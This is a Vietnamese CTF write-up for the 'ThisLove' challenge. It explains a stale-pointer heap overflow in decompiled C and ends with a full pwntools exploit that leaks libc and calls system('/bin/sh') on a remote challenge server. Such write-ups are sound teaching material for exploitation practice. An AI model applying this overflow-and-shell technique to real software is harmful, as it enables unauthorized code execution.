# ThisLove (Efiens Individual CTF 2020)



> [ThisLove]()

[Phiên bản libc local (Ubuntu 20.04)]()

## Tìm lỗi

#### Đầu tiên là về struct của một Letter object, nó có dạng như thế này:

![pic3]()

### Tổng quát chức năng hàm `NewLetter`

#### Ngay sau khi malloc xong 1 struct Letter object thì chương trình sẽ ngay lập tức gán vào tại offset 0 của struct là địa chỉ của các hàm như Sender1, Sender2 hay Sender3. Sau đó sẽ đọc nội dung thư (data do người dùng nhập) vào một vùng mới được malloc và gán con trỏ của vùng dữ liệu đó vào tại offset 0x8 của struct Letter. Đây là pseudo-code:

```C
void __cdecl NewLetter()
{
  int v0; // eax
  int v1; // ebx
  int v2; // eax
  unsigned int Length; // [rsp+Ch] [rbp-14h]

  v0 = Counter++;
  if ( v0 > 2 )
  {
    printf("Sorry, you are blocked!");
    exit(0);
  }
  v1 = Counter - 1;
  LoveLetter[v1] = (Letter *)malloc(0x10uLL);
  v2 = rand() % 3 + 1;
  if ( v2 == 3 )
  {
    LoveLetter[Counter - 1]->Function = Sender3; // gán địa chỉ function vào offset 0 của struct
  }
  else if ( v2 <= 3 )
  {
    if ( v2 == 1 )
    {
      LoveLetter[Counter - 1]->Function = Sender1; // gán địa chỉ function vào offset 0 của struct
    }
    else if ( v2 == 2 )
    {
      LoveLetter[Counter - 1]->Function = Sender2; // gán địa chỉ function vào offset 0 của struct
    }
  }
  printf("Length of letter: ");
  Length = ReadINT();
  if ( Length <= 0x400 )
    p = (char *)malloc(Length);
  if ( p )
  {
    LoveLetter[Counter - 1]->Content = p; // gán con trỏ tới vùng dữ liệu của user input vào offset 8 của struct
    printf("Enter your letter: ");
    ReadSTR(p, Length);
  }
}
```
### Tổng quát chức năng hàm `SendLetter`

#### Còn một hàm quan trọng không kém nữa là hàm `SendLetter`, hàm này sẽ cho phép bạn thực thi hàm tại có địa chỉ offset 0 của struct với tham số là con trỏ tại offset 8 của struct.

```C
void __cdecl SendLetter()
{
  if ( Counter )
    ((void (__fastcall *)(char *))LoveLetter[Counter - 1]->Function)(LoveLetter[Counter - 1]->Content); \\ gọi hàm
  else
    puts("Write a letter first.");
}
```

#### Sau khi nghịch phá binary, đọc asm và xem pseudo-code được một lúc thì mình thấy có 1 đoạn code đáng nghi ngờ trong hàm `NewLetter`

```C
  printf("Length of letter: ");
  Length = ReadINT();
  if ( Length <= 0x400 )
    p = (char *)malloc(Length);
  if ( p )
  {
    LoveLetter[Counter - 1]->Content = p;
    printf("Enter your letter: ");
    ReadSTR(p, Length);
  }
```

#### Ở đây chương trình kiểm tra độ lớn của input (do user nhập vào), mình sẽ tạm gọi là `length`, `length` \< `0x400` thì con trỏ `p` sẽ được gán thành con trỏ của vùng dữ liệu vừa được malloc() với tham số là `length`. Sau đó chương trình sẽ kiểm tra con trỏ `p` có tồn tại hay không, nếu có thì sẽ cho phép người dùng viết dữ liệu vào vùng vừa được malloc.

#### `Hmmmmm, nghe có vẻ bảo mật cao...`

#### Nhưng khoan đã, trong quá trình thực thi, hàm `NewLetter` mỗi khi được gọi đều không clear hay reset lại giá trị của con trỏ `p`, vậy trong lần gọi tiếp theo của hàm `NewLetter` con trỏ `p` sẽ giữ nguyên giá trị của lần gọi hàm `NewLetter` trước đó.

#### `Hmmmmmmmm...`

#### Vậy thì ta chỉ cần gọi hàm `NewLetter` với `length` \< `0x400` duy nhất lần đầu tiên, để chương trình luôn tồn tại con trỏ `p`, sau đó những lần tiếp theo ta có thể truyền vào `length` với độ lớn tùy ý và dữ liệu ta viết vào thì vẫn sẽ bắt đầu tại vị trí của con trỏ `p` từ lần gọi trước của hàm => `Có lỗi overflow ở đây!`

#### Tuy nhiên khi gọi hàm `NewLetter` vào những lần sau, chương trình vẫn sẽ tạo một struct mới, nhưng khi viết dữ liệu thì lại bắt đầu từ con trỏ `p` trong lần gọi hàm đầu tiên (vì những lần sau khi ta nhập `length` > 0x400 thì chương trình sẽ không malloc ra vùng chứa dữ liệu mới => giá trị của con trỏ `p` không bị thay đổi), vậy có nghĩa là ta có thể sử dụng lỗi overflow để ghi đè hết lại giá trị của hàm và tham số gọi hàm trong những struct kế tiếp đó, sau đó thì ta sẽ sử dụng chức năng hàm `SendLetter` để `chạy hàm kèm theo tham số tùy ý`.

#### Vậy là ta đã có thể kiểm soát hoàn toàn luồng thực thi của chương trình với lỗi overflow ở hàm `NewLetter` và chức năng gọi hàm ở hàm `SendLetter`

![pic2]()

#### Ở đây chương trình chỉ cho tạo struct 3 lần, đến lần thứ tự sẽ hiện thông báo `Sorry, you are blocked!` và exit.

#### Vậy trong lần gọi hàm `NewLetter` đầu tiên ta sẽ đánh lừa chương trình khởi tạo con trỏ `p`

#### Lần gọi hàm `NewLetter` thứ hai ta sẽ sử dụng lỗi overflow và hàm `SendLetter` để [leak libc]()

#### Sau khi đã leak được libc thì lần gọi hàm thứ ba, cũng là lần gọi cuối cùng ta sẽ sử dụng lỗi overflow và hàm `SendLetter` để gọi hàm `system` với tham số là `/bin/sh`

#### Vậy là đã spawn shell thành công trên remote server!!! Đây là code exploit của mình: 

```python
from pwn import *

debug = False

def write(size, payload):
    print(io.recvuntil('choice: '))
    io.sendline('1')
    print(io.recv())
    io.sendline(str(size))
    print(io.recv())
    io.sendline(payload)

def execute():
    print(io.recvuntil('choice: '))
    io.sendline('2')

elf = ELF('./thislove')
if debug:
    io = process('./thislove')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    io = remote('128.199.234.122', 4900)
    libc = ELF('libc.so')

write(6, 'AAAA')
payload = b'A'*32+p64(elf.sym['puts'])+p64(elf.got['puts'])
write(100000, payload)
execute()
libc.address = u64(io.recv(6)+b'\0\0')-libc.sym['puts']
print('LIBC: ', hex(libc.address))
payload = b'A'*64+p64(libc.sym['system'])+p64(next(libc.search(b'/bin/sh')))
write(100000, payload)
execute()
io.interactive()
```
